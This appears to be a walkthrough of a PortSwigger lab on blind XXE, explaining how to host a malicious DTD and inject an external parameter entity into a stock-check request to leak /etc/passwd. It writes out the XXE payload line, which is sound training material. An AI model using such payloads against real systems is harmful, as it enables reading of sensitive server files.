## Question:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/a4840e0f-78a9-4a80-89b6-c48be78f2e46)

## Solution:

Click "Go to exploit server" and save the following malicious DTD file on your server:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/ae50a7bd-87af-44fe-89f1-30d55c292108)

When imported, this page will read the contents of /etc/passwd into the file entity, and then try to use that entity in a file path.

Click "View exploit" and take a note of the URL for your malicious DTD.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/5edf4b70-5823-4e97-a99d-c3a1dc69299c)

URL: `https://exploit-0a9300ad030fede188fa5bef01d7009f.exploit-server.net/exploit`

You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/91e6be3a-98d7-4a8d-acb3-e728a564cbaa)

Insert the following external entity definition in between the XML declaration and the stockCheck element:

`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/ddce7552-04c4-42f7-a480-c4ed916572b3)

Lab Solved:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/9fd64c01-b983-4c42-b0b1-f523411049b8)


